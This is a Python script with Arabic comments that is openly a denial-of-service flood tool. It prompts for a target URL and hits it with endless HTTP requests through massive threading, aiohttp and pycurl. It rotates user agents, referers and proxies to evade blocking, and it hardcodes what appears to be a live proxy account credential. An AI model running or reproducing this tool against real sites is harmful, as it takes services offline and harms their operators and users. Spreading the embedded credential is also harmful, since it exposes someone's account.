import requests
import aiohttp
import asyncio
import pycurl
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
from io import BytesIO
import random
import sys
import multiprocessing
import time

# متغير لتتبع حالة إيقاف الهجوم
stop_attack_flag = False

# قائمة برؤوس HTTP مختلفة
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
]

PROXIES = [
    "geonode_7tkFHsOhK1-type-mix:75473ac6-b9dc-4da1-b57b-9cd9cd96f6fb@sg.proxy.geonode.io:9000",
    "geonode_7tkFHsOhK1-type-mix:75473ac6-b9dc-4da1-b57b-9cd9cd96f6fb@sg.proxy.geonode.io:9000",
    "geonode_7tkFHsOhK1-type-mix:75473ac6-b9dc-4da1-b57b-9cd9cd96f6fb@sg.proxy.geonode.io:9000",
    # أضف المزيد من البروكسي هنا
]

def get_random_headers():
    """إرجاع رؤوس HTTP عشوائية."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }

def get_random_proxy():
    """إرجاع بروكسي عشوائي."""
    return random.choice(PROXIES) if PROXIES else None

def send_requests_threaded(target, num_threads=20000):
    session = requests.Session()
    
    def send_request():
        while not stop_attack_flag:
            try:
                headers = get_random_headers()
                proxy = get_random_proxy()
                proxies = {"http": proxy, "https": proxy} if proxy else None
                session.get(target, headers=headers, proxies=proxies, timeout=5)
            except requests.exceptions.RequestException:
                pass

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request) for _ in range(num_threads)]
        
        for future in as_completed(futures):
            if stop_attack_flag:
                break

async def send_requests_aiohttp(target, num_requests=2000):
    async with aiohttp.ClientSession() as session:
        while not stop_attack_flag:
            tasks = []
            for _ in range(num_requests):
                headers = get_random_headers()
                proxy = get_random_proxy()
                task = asyncio.create_task(session.get(target, headers=headers, proxy=proxy, timeout=5))
                tasks.append(task)
            await asyncio.gather(*tasks, return_exceptions=True)

def send_requests_pycurl(target):
    while not stop_attack_flag:
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, target)
        c.setopt(c.WRITEDATA, buffer)
        headers = get_random_headers()
        c.setopt(c.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
        proxy = get_random_proxy()
        if proxy:
            c.setopt(c.PROXY, proxy)
        try:
            c.perform()
        except pycurl.error:
            pass
        finally:
            c.close()

def start_attack():
    global stop_attack_flag
    try:
        target = input("Target URL: ")
        print("Attack will continue indefinitely. Type 'stop' to end it.")
        execute_attack(target)
    except Exception as e:
        print(f"Error: {str(e)}")

def execute_attack(target):
    global stop_attack_flag

    print(f"Starting continuous attack on {target}...")

    try:
        # استخدام ThreadPoolExecutor للخيوط
        with ThreadPoolExecutor() as executor:
            executor.submit(send_requests_threaded, target)

        # استخدام asyncio للبرمجة غير المتزامنة
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_requests_aiohttp(target))

        # استخدام pycurl
        send_requests_pycurl(target)

        print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)

    except KeyboardInterrupt:
        stop_attack_flag = True
        print(Fore.RED + "Attack stopped." + Style.RESET_ALL)

    except Exception as e:
        print(f"Error during attack: {str(e)}")

def main():
    try:
        start_attack()
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    # استخدام uvloop إذا كان متاحًا
    try:
        import uvloop
        uvloop.install()
        print("Using uvloop for better performance.")
    except ImportError:
        print("uvloop not installed. Using default asyncio event loop.")

    main()
